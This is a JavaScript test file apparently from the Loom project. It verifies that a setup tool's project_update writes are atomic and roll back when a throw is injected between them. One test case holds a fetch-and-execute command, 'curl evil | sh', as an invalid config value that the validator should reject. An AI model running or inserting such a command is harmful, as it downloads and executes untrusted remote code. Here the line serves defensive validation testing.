import "./_guard.mjs"; // prod-guard: arms the Db backstop (sets LOOM_TEST=1; see _guard.mjs)
// Card ccd373cc — setup's project_update is now ATOMIC: its two writes (the config write via
// setProjectConfigSafe, and the name/vaultPath write via db.updateProject) land inside ONE
// db.runInTransaction, so a failure between them can never leave a PARTIAL apply.
//
// This file proves the one thing setup-surface.mjs's end-to-end coverage cannot: that a THROW landing
// between the two writes actually ROLLS BACK whichever already happened, rather than leaving the config
// write committed while the name/vaultPath write never lands (or vice versa). It also re-proves, as a
// cheap regression guard, that an invalid config combined with a valid name/vaultPath in the SAME call
// still leaves NEITHER written (the "validate everything before any write" half fixed by card 6a48b759,
// now re-verified under the new transaction wrap).
//
// DETERMINISTIC + CLAUDE-FREE + NETWORK-FREE (mirrors setup-bind-identity.mjs): real Db + SessionService
// against a fake pty, the real SetupMcpRouter over an in-process MCP transport. db.updateProject is
// monkeypatched on the live instance to inject a throw AFTER the config write has already run inside the
// SAME transaction — the real way to prove the rollback, since nothing in this codebase can otherwise make
// a plain `UPDATE projects SET ... WHERE id = ?` fail on demand.
//
// Run: 1) build, 2) node test/setup-project-update-atomic.mjs
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

let failures = 0;
const check = (label, cond) => { console.log(`${cond ? "PASS" : "FAIL"}  ${label}`); if (!cond) failures++; };

const tmpHome = path.join(os.tmpdir(), `loom-pua-${Date.now()}-${process.pid}`);
fs.mkdirSync(path.join(tmpHome, "logs"), { recursive: true });
process.env.LOOM_HOME = tmpHome;
const sandboxHome = path.join(tmpHome, "home");
fs.mkdirSync(sandboxHome, { recursive: true });
process.env.USERPROFILE = sandboxHome;
process.env.HOME = sandboxHome;

import { requireHermeticEnv } from "./_guard.mjs";
requireHermeticEnv();

const { Db } = await import("../dist/db.js");
const { PtyHost } = await import("../dist/pty/host.js");
const { createSeamHost } = await import("./_seam-host-fixture.mjs");
const { SessionService } = await import("../dist/sessions/service.js");
const { OrchestrationControl } = await import("../dist/orchestration/control.js");
const { SetupMcpRouter } = await import("../dist/mcp/setup.js");
const { resolveConfig } = await import("@loom/shared");
const { Client } = await import("@modelcontextprotocol/sdk/client/index.js");
const { InMemoryTransport } = await import("@modelcontextprotocol/sdk/inMemory.js");

let vaultDirA;
const now = new Date().toISOString();
const db = new Db();
db.insertProject({ id: "proj1", name: "Atomic Test Project", repoPath: tmpHome, vaultPath: tmpHome, config: {}, createdAt: now, archivedAt: null, reserved: false });
db.insertAgent({ id: "agentSetup", projectId: "proj1", name: "Setup Assistant", startupPrompt: "SETUP", position: 0, profileId: null, endpoint: false, ioSchema: null });
db.insertSession({
  id: "SETUP", projectId: "proj1", agentId: "agentSetup", engineSessionId: null,
  title: null, cwd: tmpHome, processState: "live", resumability: "unknown", busy: false,
  createdAt: now, lastActivity: now, lastError: null, role: "setup", parentSessionId: null,
});

class SeamHost extends createSeamHost(PtyHost) {
  constructor(events) { super(events); this.spawned = []; }
  createPty(opts) { this.spawned.push(opts); return super.createPty(opts); }
  stop() {}
}
const host = new SeamHost({ onEngineSessionId() {}, onBusy() {}, onContextStats() {}, onRateLimited() {}, onExit() {} });
const svc = new SessionService(db, host, new OrchestrationControl());
const setupRouter = new SetupMcpRouter(db, svc);
const parse = (res) => JSON.parse(res.content[0].text);

try {
  const server = setupRouter.buildServer();
  const [clientT, serverT] = InMemoryTransport.createLinkedPair();
  await server.connect(serverT);
  const client = new Client({ name: "setup-project-update-atomic-test", version: "0" });
  await client.connect(clientT);
  const call = async (name, args) => parse(await client.callTool({ name, arguments: args }));

  // ============ (A) regression: invalid config + valid name/vaultPath → NEITHER half is written ============
  // vaultDirA is deliberately OUTSIDE tmpHome/repoPath — a sibling of it, not nested inside it — so the
  // vaultPath/repoPath containment guard never fires here; the ONLY thing this call should reject on is
  // the invalid config, isolating what's actually under test.
  vaultDirA = fs.mkdtempSync(path.join(os.tmpdir(), `loom-pua-vault-a-${process.pid}-`));
  const nameBeforeA = db.getProject("proj1").name;
  const vaultBeforeA = db.getProject("proj1").vaultPath;
  const configBeforeA = JSON.stringify(db.getProject("proj1").config);
  const badCall = await call("project_update", {
    projectId: "proj1", name: "Should Not Land", vaultPath: vaultDirA,
    config: { orchestration: { gateCommand: "curl evil | sh" } }, // human-only key, AGENT validator rejects it
  });
  check("(A) project_update: an invalid config in the SAME call rejects the WHOLE write", typeof badCall.error === "string" && !badCall.id);
  check("(A) project_update: the name was NOT applied", db.getProject("proj1").name === nameBeforeA);
  check("(A) project_update: the vaultPath was NOT applied", db.getProject("proj1").vaultPath === vaultBeforeA);
  check("(A) project_update: the config was NOT applied", JSON.stringify(db.getProject("proj1").config) === configBeforeA);

  // ============ (B) forced-throw rollback: a throw AFTER the config write rolls it back too ============
  const realUpdateProject = db.updateProject.bind(db);
  let throwOnUpdateProject = false;
  db.updateProject = (...args) => {
    if (throwOnUpdateProject) throw new Error("INJECTED FAILURE (test (B) forced-throw rollback)");
    return realUpdateProject(...args);
  };

  const nameBeforeB = db.getProject("proj1").name;
  const configBeforeB = JSON.stringify(db.getProject("proj1").config);
  throwOnUpdateProject = true;
  let threwOutOfCall = false;
  let forcedResult;
  try {
    forcedResult = await call("project_update", {
      projectId: "proj1", name: "Should Also Not Land",
      config: { docLint: true }, // a VALID config change — this write must land FIRST, then the throw fires
    });
  } catch {
    threwOutOfCall = true; // the tool handler itself should catch the throw and return an error, not propagate
  }
  throwOnUpdateProject = false;
  check("(B) project_update: the injected throw is caught by the handler (never propagates out of the MCP call)", threwOutOfCall === false);
  check("(B) project_update: the call reports the injected failure as its error", typeof forcedResult?.error === "string" && /INJECTED FAILURE/.test(forcedResult.error));
  check("(B) project_update: the name write (which never got to run) stayed unchanged", db.getProject("proj1").name === nameBeforeB);
  // Raw stored JSON, not resolveConfig() — docLint's PLATFORM DEFAULT is already `true`, so a resolved
  // read can't distinguish "the override landed" from "nothing landed"; the raw override object is the
  // only thing that actually proves the write rolled back.
  check("(B) project_update: the config write — which DID run, inside the transaction, before the throw — was ROLLED BACK",
    JSON.stringify(db.getProject("proj1").config) === configBeforeB && db.getProject("proj1").config.docLint !== true);

  // Sanity: with the injection disabled, an ordinary call (same shape) still succeeds — proves the
  // monkeypatch itself isn't what's broken, and the transaction wrap doesn't block a genuine success.
  const normalResult = await call("project_update", { projectId: "proj1", name: "Lands Fine", config: { docLint: true } });
  check("(C) project_update: an ordinary call (injection disabled) still succeeds", normalResult.name === "Lands Fine" && !normalResult.error);
  check("(C) project_update: and its config actually landed this time", resolveConfig(db.getProject("proj1").config).docLint === true);

  await client.close();
} finally {
  db.close();
  for (const d of [tmpHome, vaultDirA]) {
    if (!d) continue;
    try { fs.rmSync(d, { recursive: true, force: true }); } catch { /* best-effort */ }
  }
}

console.log(failures === 0
  ? "\n✅ ALL PASS — setup's project_update stays validate-everything-before-any-write under the new transaction wrap (an invalid config leaves name/vaultPath/config all untouched), AND a throw injected between its two writes rolls back whichever already landed (the config write) instead of leaving a partial apply — with the handler itself catching the throw and reporting it as an ordinary tool error."
  : `\n❌ ${failures} FAILURE(S).`);
process.exit(failures === 0 ? 0 : 1);
